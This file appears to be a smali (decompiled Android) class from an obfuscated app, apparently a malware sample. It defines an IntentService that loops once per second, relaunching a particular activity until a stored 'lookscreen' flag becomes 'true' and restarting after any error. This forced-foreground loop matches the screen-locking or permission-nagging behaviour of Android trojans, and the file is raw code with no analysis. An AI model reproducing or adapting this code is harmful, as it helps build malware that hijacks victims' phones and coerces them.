.class public Lwocwvy/czyxoxmbauu/slsa/ttiegryczsx;
.super Landroid/app/IntentService;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "ttiegryczsx"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ttiegryczsx;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 2

    :cond_0
    :goto_0
    :try_start_0
    sget-object p1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v0, 0x3e8

    invoke-virtual {p1, v0, v1}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_1
    :try_start_1
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/ncec/zjwruw;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ttiegryczsx;->startActivity(Landroid/content/Intent;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ttiegryczsx;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "lookscreen"

    invoke-virtual {p1, p0, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "true"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-nez p1, :cond_0

    return-void

    :catch_1
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ttiegryczsx;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "ERROR"

    const-string v1, "zjwruw"

    invoke-virtual {p1, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method
